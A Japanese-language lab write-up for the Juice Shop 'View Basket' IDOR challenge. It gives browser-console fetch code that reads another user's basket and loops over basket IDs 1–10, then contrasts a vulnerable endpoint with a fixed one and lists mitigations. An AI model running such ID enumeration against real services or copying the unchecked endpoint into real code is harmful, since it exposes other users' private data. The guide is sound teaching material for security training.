# View Basket ✅

**難易度:** ⭐⭐
**カテゴリ:** IDOR (Insecure Direct Object Reference)
**目標:** 他のユーザーのカートの中身を見る

---

## 背景知識

### IDOR（安全でない直接オブジェクト参照）とは

IDOR は、**URLやパラメータに含まれるID/参照を変更することで、本来アクセスできないリソースにアクセスできてしまう脆弱性**。

```
┌─────────────────────────────────────────────────────────────────┐
│                     正常なアクセス                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ユーザーA (ID: 1)                        サーバー              │
│      │                                        │                │
│      │  GET /rest/basket/1                    │                │
│      │  (自分のカートを取得)                   │                │
│      │ ─────────────────────────────────────▶ │                │
│      │                                        │                │
│      │                         ユーザーAのカートを返す           │
│      │                                        │                │
│      │  { items: [...] }                      │                │
│      │ ◀───────────────────────────────────── │                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                     IDOR 攻撃                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ユーザーA (ID: 1)                        サーバー              │
│      │                                        │                │
│      │  GET /rest/basket/2  ← IDを変更！      │                │
│      │  (他人のカートを要求)                   │                │
│      │ ─────────────────────────────────────▶ │                │
│      │                                        │                │
│      │                         所有権チェックなし 😱            │
│      │                         ユーザーBのカートを返す           │
│      │                                        │                │
│      │  { items: [他人の購入予定商品...] }    │                │
│      │ ◀───────────────────────────────────── │                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

ホテルの部屋を想像してください:

- **正しい仕組み**: 部屋101のカギは101号室しか開けられない
- **IDOR**: 「101」と書いたカードを「102」に書き換えたら、102号室も開いてしまった

つまり、**「認証」はしているが「認可」がない**状態。
- 認証 (Authentication): 「あなたは誰？」→ ログイン済みか確認
- 認可 (Authorization): 「あなたはそれにアクセスできる？」→ **これが欠けている**

### なぜ危険？

IDORは OWASP Top 10 で「Broken Access Control」として1位に挙げられる深刻な脆弱性:

| 被害の例 | 説明 |
|---------|------|
| 個人情報漏洩 | 住所、電話番号、支払い情報 |
| 機密データ閲覧 | 他人の注文履歴、メッセージ |
| データ改ざん | 他人のプロフィール変更 |
| 権限昇格 | 管理者のデータにアクセス |
| アカウント乗っ取り | パスワードリセットトークンの取得 |

---

## 思考プロセス

### ステップ1: 自分のカートのURLを確認

```
「カートページを開いてAPIを観察しよう」
    ↓
「DevTools → Network タブを開く」
    ↓
「カートページにアクセス」
    ↓
「GET /rest/basket/1 というリクエストを発見」
    ↓
「レスポンス: { id: 1, items: [...] }」
    ↓
「1 は何を意味する？自分のユーザーIDかカートIDか」
```

### ステップ2: IDの意味を確認

```
「自分のユーザー情報を確認」
    ↓
「LocalStorage から token をデコード」
    ↓
「または /rest/user/whoami で確認」
    ↓
「自分のID = 1 なら、2 は他のユーザー」
```

### ステップ3: IDを変えてアクセス

```
「/rest/basket/2 にリクエストを送ってみる」
    ↓
「認証トークンは自分のもの」
「でもカートIDは 2（他人）」
    ↓
「結果: 他のユーザーのカート内容が見えた！」
```

### ステップ4: 脆弱性を理解

```
「サーバーは何をチェックしている？」
    ↓
「✓ 認証: ログイン済みかどうか → チェックしている」
「✗ 認可: このカートの所有者か → チェックしていない！」
    ↓
「これが IDOR 脆弱性」
```

---

## 実行手順

### Step 1: ログインする

任意のユーザーでログイン（例: admin@juice-sh.op）

### Step 2: 自分のカートIDを確認

DevTools の Network タブでカートページにアクセスし、リクエストを確認:

```
Request: GET /rest/basket/1
Response: { "status": "success", "data": { "id": 1, ... } }
```

### Step 3: 他のユーザーのカートにアクセス

Console で以下を実行:

```javascript
// 自分のトークンで、他人のカート (ID: 2) にアクセス
fetch('/rest/basket/2', {
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  }
}).then(r => r.json()).then(console.log);
```

### Step 4: 結果を確認

```javascript
// 成功すると、他人のカート内容が表示される
{
  "status": "success",
  "data": {
    "id": 2,
    "coupon": null,
    "createdAt": "2024-01-01T00:00:00.000Z",
    "Products": [
      { "name": "Apple Juice", "price": 1.99, ... },
      ...
    ]
  }
}
```

### Step 5: 複数のIDを試す（任意）

```javascript
// 1から10までのカートを取得
for (let i = 1; i <= 10; i++) {
  fetch('/rest/basket/' + i, {
    headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
  })
  .then(r => r.json())
  .then(data => console.log('Basket ' + i + ':', data));
}
```

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード
app.get('/rest/basket/:id', (req, res) => {
  const basketId = req.params.id;

  // 認証のみチェック（ログインしているか）
  if (!req.user) {
    return res.status(401).send('Unauthorized');
  }

  // 認可チェックなし！誰のカートでも返す
  Basket.findByPk(basketId).then(basket => {
    res.json(basket);
  });
});
```

### 問題点

1. **認証のみ**: 「ログインしているか」だけチェック
2. **認可なし**: 「このカートの所有者か」をチェックしていない
3. **直接参照**: URLのIDをそのままDBクエリに使用

---

## 安全な実装

```javascript
// ✅ 安全なコード
app.get('/rest/basket/:id', (req, res) => {
  const basketId = req.params.id;

  // 1. 認証チェック
  if (!req.user) {
    return res.status(401).send('Unauthorized');
  }

  // 2. カートを取得
  Basket.findByPk(basketId).then(basket => {
    if (!basket) {
      return res.status(404).send('Not found');
    }

    // 3. 認可チェック：カートの所有者が現在のユーザーか確認
    if (basket.UserId !== req.user.id) {
      return res.status(403).send('Forbidden');  // アクセス拒否
    }

    // 4. 所有者の場合のみ返す
    res.json(basket);
  });
});
```

### 対策のポイント

| 対策 | 説明 |
|------|------|
| **所有権チェック** | リソースの所有者と現在のユーザーを比較 |
| **予測困難なID** | 連番ではなくUUIDを使用 |
| **間接参照** | セッションから所有リソースを特定 |
| **ACL** | アクセス制御リストで権限管理 |

---

## IDOR の発見パターン

### 1. URL パスのID

```
/users/123/profile    → /users/124/profile
/orders/1001          → /orders/1002
/files/doc_12345.pdf  → /files/doc_12346.pdf
```

### 2. クエリパラメータ

```
/api/data?user_id=123  → /api/data?user_id=124
/export?report=my_report → /export?report=admin_report
```

### 3. POSTボディ

```json
// 元のリクエスト
{ "orderId": 1001 }

// 改ざん
{ "orderId": 1002 }
```

### 4. Cookie / Header

```
X-User-ID: 123 → X-User-ID: 124
```

---

## 関連するOWASPリスク

| OWASP Top 10 | 関連性 |
|-------------|--------|
| A01:2021 - Broken Access Control | IDOR は直接該当 |
| A04:2021 - Insecure Design | 設計段階での考慮不足 |

---

## 関連チャレンジ

- [Forged Feedback](../difficulty-3/forged-feedback.md) - 他人としてフィードバック送信
- [Forged Review](../difficulty-3/forged-review.md) - 他人のレビューを改ざん
- [Manipulate Basket](../difficulty-3/manipulate-basket.md) - カート操作
- [GDPR Data Erasure](../difficulty-3/gdpr-data-erasure.md) - 他人のデータ削除

## 参考リンク

- [OWASP - IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [PortSwigger - Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [OWASP Top 10 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
